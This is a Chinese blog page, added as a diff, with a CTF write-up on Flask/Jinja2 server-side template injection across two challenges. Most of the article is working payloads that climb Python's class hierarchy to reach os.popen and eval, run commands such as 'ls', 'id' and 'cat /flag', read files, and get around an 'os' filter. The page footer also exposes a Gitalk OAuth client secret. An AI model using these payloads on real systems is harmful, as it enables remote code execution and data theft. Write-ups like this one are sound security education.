@@ -1,0 +1,86 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="SSTI"><meta name="keywords" content="CTF题,SSTI"><meta name="author" content="Extrader"><meta name="copyright" content="Extrader"><title>SSTI | Extrader</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-python-template-injection"><span class="toc-number">1.</span> <span class="toc-text">Web_python_template_injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd—fake-google"><span class="toc-number">2.</span> <span class="toc-text">BJDCTF-2nd—fake google</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Extrader</div><div class="author-info__description text-center">error天上来</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">25</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">19</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">4</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://wlaport.top/" target="_blank" rel="noopener">Zhu</a><a class="author-info-links__name text-center" href="https://www.suk1.top/" target="_blank" rel="noopener">Manayakko</a><a class="author-info-links__name text-center" href="https://www.zhaoj.in/" target="_blank" rel="noopener">Glzjin</a><a class="author-info-links__name text-center" href="https://www.leavesongs.com/" target="_blank" rel="noopener">Phithon</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/blog/1581057368432.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Extrader</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">SSTI</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-26</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">669</span><span class="post-meta__separator">|</span><span>阅读时长: 2 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>打开链接发现就一个这东西</p>
+<p><img src="/.top//image-81.png" alt></p>
+<p>懵了，于是购买writeup进行学习：</p>
+<p>发现该题是一个利用“Python SSTI”,“404模板注入”的原理</p>
+<p>题目类型深度剖析移步大佬的文章：<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a></p>
+<p><a href="从零学习flask模板注入.pdf">网页PDF</a></p>
+<p>方法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+<p>解题步骤：</p>
+<p>1、测试是否存在SSTI：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;1+2&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.top//image-82.png" alt></p>
+<p>事实证明存在SSTI</p>
+<p>2、访问</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来查看所有模块</p>
+<p>3、os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个（我眼瞎了，不要问我为什么）</p>
+<p><img src="/.top//image-83.png" alt></p>
+<p>4、访问</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p>
+<p><img src="/.top//image-84.png" alt></p>
+<p>5.使用[‘o’+’s’],可绕过对os字符的过滤，访问</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看flag文件所在</p>
+<p><img src="/.top//image-85.png" alt></p>
+<p>6、访问</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;"".__class__.__mro__[2].__subclasses__()[40]("fl4g").read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可得到flag，如图所示</p>
+<p><img src="/.top//image-86.png" alt></p>
+<p><strong>writeup里的另外一种姿势：</strong></p>
+<p><img src="/.top//image-87.png" alt></p>
+<p><strong>另外，里面还有一种更骚的操作：</strong></p>
+<p><img src="/.top//image-88.png" alt></p>
+<p>这里用到了一个工具：<a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap</a></p>
+<p>一个扫描服务器端模板注入漏洞的开源工具 ，需要自取</p>
+<p>附上OS文件目录的方法： <a href="https://www.runoob.com/python/os-file-methods.html" target="_blank" rel="noopener">Python OS 文件/目录方法</a></p>
+<h3 id="BJDCTF-2nd—fake-google"><a href="#BJDCTF-2nd—fake-google" class="headerlink" title="BJDCTF-2nd—fake google"></a>BJDCTF-2nd—fake google</h3><p>界面：</p>
+<p><img src="/.top//image-20200324100426394.png" alt="image-20200324100426394"></p>
+<p>随便输入测试后得到一以下结果，推测是SSTI</p>
+<p><img src="/.top//image-20200324100451322.png" alt="image-20200324100451322"></p>
+<p>F12打开后发现提示果然是SSTI</p>
+<p><img src="/.top//image-20200324100534466.png" alt="image-20200324100534466"></p>
+<p>测试后发现啥都没过滤，于是直接上payload：</p>
+<p>payload1：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('cd ..;ls;cat flag').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload2：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'cat /flag | base64'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('id').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件操作：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'filename'</span>, <span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Extrader</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.extrader.top/2020/03/22/SSTI/">https://www.extrader.top/2020/03/22/SSTI/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.extrader.top">Extrader</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF%E9%A2%98/">CTF题</a><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/03/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa fa-chevron-left">  </i><span>文件上传</span></a></div><div class="next-post pull-right"><a href="/2020/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"><span>文件包含漏洞小结</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
+  clientID: 'dcbaba23dd5d2cbb1cc2',
+  clientSecret: '39bc1e41152f9936638fa5d9f2c542ac945d9fe1',
+  repo: 'Extrader-home.github.io',
+  owner: 'Extrader-home',
+  admin: 'Extrader-home',
+  id: md5(decodeURI(location.pathname)),
+  language: 'zh-CN'
+})
+gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(/img/blog/1581057368432.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Extrader</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
